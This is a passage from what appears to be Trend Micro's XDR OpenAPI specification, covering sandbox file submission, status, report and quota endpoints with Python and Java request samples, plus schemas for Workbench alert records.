            "source": "import java.io.File;\nimport java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/sandbox/file\";\n        String token = \"YOUR_TOKEN\";\n\n        HttpEntity multipartEntity = MultipartEntityBuilder.create()\n                .setContentType(ContentType.MULTIPART_FORM_DATA)\n                .addTextBody(\"documentPassword\", \"YOUR_DOCUMENTPASSWORD (base64-encoded characters)\")\n                .addTextBody(\"archivePassword\", \"YOUR_ARCHIVEPASSWORD (base64-encoded characters)\")\n                .addBinaryBody(\"file\", new File(\"YOUR_FILEPATH (string)\"), ContentType.create(\"application/octet-stream\"), \"YOUR_FILENAME (string)\")\n                .build();\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .setEntity(multipartEntity)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/sandbox/tasks/{taskId}": {
      "get": {
        "tags": [
          "Sandbox Analysis"
        ],
        "summary": "Get file analysis status",
        "description": "Retrieves the status of a submitted file\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Sandbox Analysis</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Submit objects</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "taskId",
            "in": "path",
            "description": "Sample submit taskid",
            "required": true,
            "schema": {
              "type": "string",
              "example": "012e4eac-9bd9-4e89-95db-77e02f75a6f3",
              "maxLength": 36
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/sandbox-FileStatus"
                }
              }
            }
          },
          "400": {
            "description": "BadRequest",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "BadRequest",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "NotFound",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Not Found",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "409": {
            "description": "Conflict",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "Conflict",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Parameters or values are invalid",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "InternalError",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "InternalError",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Internal Server Error",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/sandbox/tasks/{taskId}'\nurl_path = url_path.format(**{'taskId': 'YOUR_TASKID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/sandbox/tasks/{taskId}\";\n        urlPath = urlPath.replace(\"{taskId}\", \"YOUR_TASKID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/sandbox/reports/{reportId}": {
      "get": {
        "tags": [
          "Sandbox Analysis"
        ],
        "summary": "Get file analysis report",
        "description": "Retrieves the analysis report, investigation package, or Suspicious Object List of a submitted file\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Sandbox Analysis</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Submit objects</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "reportId",
            "in": "path",
            "description": "file reportId",
            "required": true,
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "type",
            "in": "query",
            "description": "report type",
            "required": true,
            "schema": {
              "type": "string",
              "enum": [
                "vaReport",
                "investigationPackage",
                "suspiciousObject"
              ]
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation. Media type of vaReport is application/pdf; Media type of investigationPackage is application/zip; Media type of suspiciousObject is application/json, suspiciousObject is generated only for high risk result.",
            "content": {
              "binary/octet-stream": {
                "schema": {
                  "type": "string",
                  "format": "binary"
                }
              },
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/sandbox-SOLists"
                }
              }
            }
          },
          "400": {
            "description": "BadRequest",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "BadRequest",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "NotFound",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "409": {
            "description": "Conflict",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "Conflict",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Parameters or values are invalid",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "InternalError",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "InternalError",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Internal Server Error",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/sandbox/reports/{reportId}'\nurl_path = url_path.format(**{'reportId': 'YOUR_REPORTID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'type': 'YOUR_TYPE (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    with open('YOUR_FILEPATH', 'wb') as f:\n        f.write(r.content)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport java.io.FileOutputStream;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/sandbox/reports/{reportId}\";\n        urlPath = urlPath.replace(\"{reportId}\", \"YOUR_REPORTID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"type\", \"YOUR_TYPE (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        FileOutputStream fos = new FileOutputStream(\"YOUR_FILEPATH\");\n                        fos.write(EntityUtils.toByteArray(entity));\n                        fos.flush();\n                        fos.close();\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/sandbox/quota": {
      "get": {
        "tags": [
          "Sandbox Analysis"
        ],
        "summary": "Get file submission quota",
        "description": "Retrieves the maximum number of files that you can submit to the sandbox per day (Note. Each daily quota requires 50 credits. Objects with a \"Not analyzed\" risk level do not count toward this quota. Does not require credits in regions where Sandbox Analysis has not been officially released.)\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Sandbox Analysis</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Submit objects</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/sandbox-Quota"
                }
              }
            }
          },
          "400": {
            "description": "BadRequest",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "BadRequest",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Invalid HTTP Request",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "409": {
            "description": "Conflict",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "Conflict",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Parameters or values are invalid",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "InternalError",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "InternalError",
                          "description": "Error Code"
                        },
                        "message": {
                          "type": "string",
                          "example": "Internal Server Error",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/sandbox/quota'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/sandbox/quota\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    }
  },
  "components": {
    "schemas": {
      "awb-workbenchDetailHostInfo": {
        "type": "object",
        "description": "Host information",
        "required": [
          "name",
          "ips",
          "guid"
        ],
        "properties": {
          "name": {
            "type": "string",
            "description": "Host name",
            "example": "CODERED\\\\bonus-PC"
          },
          "ips": {
            "type": "array",
            "description": "Set of IPs",
            "items": {
              "type": "string",
              "example": "10.110.2.1"
            },
            "example": [
              "10.110.2.1",
              "10.112.87.0"
            ]
          },
          "guid": {
            "description": "GUID",
            "type": "string",
            "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
          }
        },
        "example": {
          "name": "CODERED\\\\bonus-PC",
          "ips": [
            "10.110.2.1",
            "10.112.87.0"
          ],
          "guid": "5257b401-2fd7-469c-94fa-39a4f11eb925"
        }
      },
      "awb-WorkbenchDetails": {
        "type": "object",
        "properties": {
          "info": {
            "type": "object",
            "description": "* 3002000: Get workbench details successfully.\n",
            "properties": {
              "code": {
                "description": "code",
                "type": "integer",
                "example": 3002000,
                "enum": [
                  3002000
                ]
              },
              "msg": {
                "type": "string",
                "example": "Get workbench details successfully."
              }
            }
          },
          "data": {
            "oneOf": [
              {
                "$ref": "#/components/schemas/awb-SAEWorkbenchDetailsData"
              },
              {
                "$ref": "#/components/schemas/awb-TIWorkbenchDetailsData"
              }
            ],
            "discriminator": {
              "propertyName": "alertProvider",
              "mapping": {
                "SAE": "#/components/schemas/awb-SAEWorkbenchDetailsData",
                "TI": "#/components/schemas/awb-TIWorkbenchDetailsData"
              }
            }
          }
        }
      },
      "awb-WorkbenchHistoryV2Details": {
        "type": "object",
        "properties": {
          "info": {
            "description": "* 3008000 - Retrieve workbench summary information successfully.\n",
            "type": "object",
            "properties": {
              "code": {
                "description": "code",
                "type": "integer",
                "example": 3008000,
                "enum": [
                  3008000
                ]
              },
              "msg": {
                "description": "msg",
                "type": "string",
                "example": "Request processed successfully."
              }
            }
          },
          "data": {
            "type": "object",
            "properties": {
              "totalCount": {
                "description": "Total count",
                "type": "integer"
              },
              "modelList": {
                "description": "Distinct model list of visible workbenches of the current customer",
                "type": "array",
                "items": {
                  "type": "string"
                }
              },
              "workbenchRecords": {
                "description": "Workbench records returned",
                "type": "array",
                "items": {
                  "properties": {
                    "investigationStatus": {
                      "deprecated": true,
                      "type": "integer",
                      "description": "0: New, 1: In Progress, 2: Resolved: True Positive, 3: Resolved: False Positive, 4: Resolved: Benign True Positive, 5: Resolved"
                    },
                    "status": {
                      "type": "integer",
                      "description": "The status of a case or investigation.\n\nAvailable statuses:\n* `1` - Open, \n* `2` - In Progress\n* `3` - Closed\n"
                    },
                    "investigationResult": {
                      "type": "integer",
                      "description": "The findings of a case or investigation.\n\nAvailable results:\n\n* `0` - No findings\n* `1` - Noteworthy\n* `2` - True positive\n* `3` - False positive\n* `4` - Benign true positive\n* `5` - Other findings\n"
                    },
                    "priorityScore": {
                      "example": 60,
                      "type": "integer"
                    },
                    "workbenchName": {
                      "example": "Heartbeat Model",
                      "type": "string"
                    },
                    "workbenchId": {
                      "example": "WB-2-20200214-00003",
                      "type": "string"
                    },
                    "workbenchLink": {
                      "example": "https://THE_WORKBENCH_URL",
                      "type": "string"
                    },
                    "createdTime": {
                      "example": "2020-02-14T10:05:09Z",
                      "type": "string"
                    },
                    "updatedTime": {
                      "example": "2020-02-15T10:05:09Z",
                      "type": "string"
                    },
                    "severity": {
                      "description": "Now it would be \"critical\" / \"high\" / \"medium\" / \"low\"; null if it cannot be got (i.e., \"severity\": null)",
                      "example": "critical",
                      "type": "string"
                    },
                    "modelId": {
                      "description": "ID of the detection model that triggered the alert",
                      "example": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                      "type": "string"
                    },
                    "modelType": {
                      "description": "Type of the detection model that triggered the alert",
                      "example": "preset, custom",
                      "type": "string",
                      "enum": [
                        "preset",
                        "custom"
                      ]
                    },
                    "impactScope": {
                      "type": "object",
                      "properties": {
                        "desktopCount": {
                          "type": "integer",
                          "description": "Number of affected desktops"
                        },
                        "serverCount": {
                          "type": "integer",
                          "description": "Number of affected servers"
                        },
                        "accountCount": {
                          "type": "integer",
                          "description": "Number of affected accounts"
                        },
                        "emailAddressCount": {
                          "type": "integer",
                          "description": "Number of affected email addresses"
                        },
                        "containerCount": {
                          "description": "Number of affected containers",
                          "type": "integer"
                        },
                        "cloudIdentityCount": {
                          "description": "Number of affected cloud resources",
                          "type": "integer"
                        }
                      }
                    },
                    "caseId": {
                      "description": "The unique identifier of a case",
                      "type": "string",
                      "example": "CL-12345-20230718-00012"
                    },
                    "ownerIds": {
                      "description": "The owners of the Workbench alert",
                      "items": {
                        "type": "string",
                        "example": [
                          "6962a2ec-5960-4c3f-829d-e8f11ea0f70e"
                        ]
                      }
                    },
                    "detail": {
                      "oneOf": [
                        {
                          "$ref": "#/components/schemas/awb-SAEWorkbenchDetailsDataV2"
                        },
                        {
                          "$ref": "#/components/schemas/awb-TIWorkbenchDetailsDataV2"
                        }
                      ],
                      "discriminator": {
                        "propertyName": "alertProvider",
                        "mapping": {
                          "SAE": "#/components/schemas/awb-SAEWorkbenchDetailsDataV2",
                          "TI": "#/components/schemas/awb-TIWorkbenchDetailsDataV2"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "awb-SAEWorkbenchDetailsData": {
        "type": "object",
        "properties": {
          "schemaVersion": {
            "type": "string",
            "description": "Schema version",
            "example": "1.0"
          },
          "workbenchId": {
            "type": "string",
            "description": "Workbench ID",
            "example": "WB-9002-20200427-0002"
          },
          "workbenchLink": {
            "type": "string",
            "description": "Workbench URL",
            "example": "https://THE_WORKBENCH_URL"
          },
          "alertProvider": {
            "type": "string",
            "description": "Alert provider",
            "example": "SAE"
          },
          "model": {
            "type": "string",
            "description": "Name of the detection model that triggered the alert",
            "example": "Possible APT Attack"
          },
          "description": {
            "type": "string",
            "description": "Description of the detection model that triggered the alert",
            "example": "A backdoor was possibly implanted after a user received a possible spear phishing email message."
          },
          "score": {
            "type": "string",
            "description": "Overall severity assigned to the alert based on the severity of the matched detection model and the impact scope",
            "example": "63"
          },
          "modelSeverity": {
            "type": "string",
            "description": "low, medium, high, or critical",
            "example": "critical"
          },
          "impactScope": {
            "type": "array",
            "description": "Entities affected by the alert",
            "items": {
              "type": "object",
              "properties": {
                "entityType": {
                  "type": "string",
                  "description": "Could be host, account or emailAddress",
                  "example": "host"
                },
                "entityValue": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "loki@jaguartm.onmicrosoft.com"
                    },
                    {
                      "type": "object",
                      "properties": {
                        "name": {
                          "type": "string",
                          "example": "CODERED\\\\bonus-PC"
                        },
                        "ips": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "example": "10.110.2.1"
                          }
                        },
                        "guid": {
                          "type": "string",
                          "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                        }
                      }
                    }
                  ],
                  "example": {
                    "name": "CODERED\\\\bonus-PC",
                    "ips": [
                      "10.110.2.1",
                      "10.112.87.0"
                    ],
                    "guid": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                  }
                },
                "entityId": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                    },
                    {
                      "type": "array",
                      "items": {
                        "type": "string",
                        "example": "10.110.2.1"
                      }
                    }
                  ]
                },
                "managementScopeGroupId": {
                  "type": "string",
                  "description": "Group ID for management scope",
                  "example": "deadbeef-292e-42ae-86be-d2fef483a248"
                },
                "managementScopeInstanceId": {
                  "type": "string",
                  "description": "The instance ID for asset visibility scope",
                  "example": "1babc299-52de-44f4-a1d2-8a224f391eee"
                },
                "managementScopePartitionKey": {
                  "type": "string",
                  "description": "The partition key for asset visibility scope",
                  "example": "4c1850c0-8a2a-4637-9f88-6afbab54dd79"
                },
                "relatedEntities": {
                  "type": "array",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "CODERED\\\\loki"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "relatedIndicators": {
                  "type": "array",
                  "items": {
                    "type": "integer",
                    "example": 1
                  }
                },
                "customTags": {
                  "description": "The custom tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the custom tag",
                        "example": "Department"
                      },
                      "value": {
                        "description": "The value of the custom tag",
                        "type": "string",
                        "example": "finance"
                      }
                    }
                  }
                },
                "platformTags": {
                  "description": "The list of platform tags for asset impact scope",
                  "type": "array",
                  "items": {
                    "type": "object",
                    "properties": {
                      "key": {
                        "type": "string",
                        "description": "The label of the platform tag",
                        "example": "Asset group"
                      },
                      "value": {
                        "description": "The value of the platform tag",
                        "type": "string",
                        "example": "eu"
                      }
                    }
                  }
                }
              }
            }
          },
          "indicators": {
            "type": "array",
            "description": "The indicators refer to those objects which are found by RCA or sweeping",
            "items": {
              "type": "object",
              "properties": {
                "id": {
                  "type": "integer",
                  "example": 1
                },
                "objectType": {
                  "type": "string",
                  "example": "url"
                },
                "objectValue": {
                  "oneOf": [
                    {
                      "type": "string",
                      "example": "http://www.DVftYKDtEi.com/ds7002.zip"
                    },
                    {
                      "type": "object",
                      "properties": {
                        "name": {
                          "type": "string",
                          "example": "CODERED\\\\bonus-PC"
                        },
                        "ips": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "example": "10.110.2.1"
                          }
                        },
                        "guid": {
                          "type": "string",
                          "example": "5257b401-2fd7-469c-94fa-39a4f11eb925"
                        }
                      }
                    }
                  ]
                },
                "relatedEntities": {
                  "type": "array",
                  "items": {
                    "oneOf": [
                      {
                        "type": "string",
                        "example": "loki@jaguartm.onmicrosoft.com"
                      },
                      {
                        "type": "array",
                        "items": {
                          "type": "string",
                          "example": "10.1.152.61"
                        }
                      }
                    ]
                  }
                },
                "filterId": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "example": "f862df72-7f5e-4b2b-9f7f-9148e875f908"
                  }
                }
              }
            }
          },
          "matchedRules": {
            "type": "array",
            "description": "The rules are triggered",
